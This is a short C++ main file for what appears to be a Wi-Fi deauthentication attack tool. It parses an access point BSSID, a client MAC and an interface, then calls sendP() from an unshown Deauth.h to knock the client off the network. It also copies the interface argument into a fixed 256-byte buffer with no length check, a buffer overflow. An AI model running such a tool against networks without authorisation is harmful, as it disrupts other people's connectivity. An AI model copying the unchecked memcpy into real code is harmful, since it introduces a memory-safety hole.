#include <iostream>
#include <cstdio>
#include <cstdlib>
#include <cstring>

#include <Deauth.h>

void print(uint8_t const * in) {
  for (int i = 0; i != 5; ++i)
    printf("%02x:", in[i]);
  printf("%02x\n", in[5]);
}

int main(int argc, char *argv[]) {

  // deauth bssid stmac iface
  if (argc < 4) {
    std::cerr << "Usage: ./deauth bssid stmac iface" << std::endl;
    return -1;
  }

  uint8_t bssid[6];
  for (int i = 0; i != 6; ++i)
    bssid[i] = strtol(argv[1]+i*3, NULL, 16);
  uint8_t stmac[6];
  for (int i = 0; i != 6; ++i)
    stmac[i] = strtol(argv[2]+i*3, NULL, 16);

  char iface[256];
  int const iface_len = strlen(argv[3]);
  memcpy(iface, argv[3], iface_len);
  iface[iface_len] = 0;

  sendP(iface, bssid, stmac);

  return 0;
}
